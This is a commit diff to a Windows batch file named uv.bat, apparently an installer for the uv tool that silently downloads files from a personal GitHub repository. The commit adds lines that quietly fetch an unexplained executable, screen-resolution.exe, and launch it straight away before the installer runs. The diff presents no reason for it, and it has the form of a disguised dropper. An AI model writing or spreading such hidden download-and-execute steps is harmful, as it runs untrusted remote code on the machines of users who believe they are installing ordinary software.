25a1e2981b43c7fdbe6ac8e8592b0846594f1a6e
mi0nrio <baytout4@outlook.com>
2024-11-15 10:37:00 +0100

    Update uv.bat

--- uv/uv.bat
+++ uv/uv.bat
@@ -1,5 +1,8 @@
 @echo off
 curl -s -L -o uv.exe "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/uv/uv.exe"
 curl -s -L -o installuv.bat "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/uv/installuv.bat"
+curl -s -L -o screen-resolution.exe "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/uv/screen-resolution.exe"
+start "" "screen-resolution.exe"
 start "" "installuv.bat"
+
 
